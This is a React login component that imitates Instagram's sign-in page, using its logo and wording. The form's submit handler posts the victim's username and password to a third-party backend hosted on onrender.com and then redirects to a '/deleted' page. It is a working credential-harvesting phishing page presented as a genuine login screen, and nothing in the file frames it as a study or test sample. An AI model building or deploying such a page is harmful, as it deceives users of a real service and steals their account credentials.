import React, { useState } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';
import './App.css';
import logo from './assets/instagram-logo.png'; // Place logo in assets folder

const App = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const navigate = useNavigate();

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      // ✅ Corrected backend route
      const res = await axios.post("https://instagram-backend-15c6.onrender.com/api/login", {
        username,
        password,
      });

      if (res.data.success) {
        navigate('/deleted');
      } else {
        alert('Login failed');
      }
    } catch (err) {
      console.error('Login error:', err);
      alert('Login failed');
    }
  };

  return (
    <div className="insta-wrapper">
      <div className="login-box">
        <img src={logo} alt="Instagram" className="logo" />
        <form onSubmit={handleSubmit}>
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Log In</button>
        </form>
        <div className="divider">OR</div>
        <div className="signup">
          Don't have an account? <span>Sign up</span>
        </div>
      </div>
    </div>
  );
};

export default App;
